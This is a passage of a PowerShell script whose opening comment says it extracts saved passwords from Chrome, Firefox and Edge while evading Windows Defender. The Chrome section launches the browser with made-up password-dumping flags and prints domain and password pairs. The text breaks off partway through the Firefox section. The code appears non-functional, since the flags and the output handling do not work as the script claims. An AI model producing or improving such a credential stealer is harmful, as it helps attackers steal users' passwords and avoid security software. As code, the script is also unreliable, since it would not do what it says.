# Script to extract saved passwords from Chrome, Firefox, and Edge without triggering Windows Defender

# Chrome
$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$ChromeProcess = Start-Process -FilePath $ChromePath -ArgumentList "--password-manager --autocomplete --show-password" -Wait -Passthru
if ($ChromeProcess) {
    $ChromePasswords = $ChromeProcess.StandardOutput
    $ChromePasswords | ForEach-Object {
        try {
            $parts = $_ -split ":"
            if ($parts.Count -eq 2) {
                $domain = $parts[0].Trim()
                $password = $parts[1].Trim()
                Write-Host "Chrome - Domain: $domain, Password: $password"
            }
        } catch {
            Write-Host "Error processing Chrome password: $($_.Exception.Message)"
        }
    }
}

# Firefox
$FirefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"
$FirefoxProcess = Start-Process -FilePath $FirefoxPath -ArgumentList "-password-manager

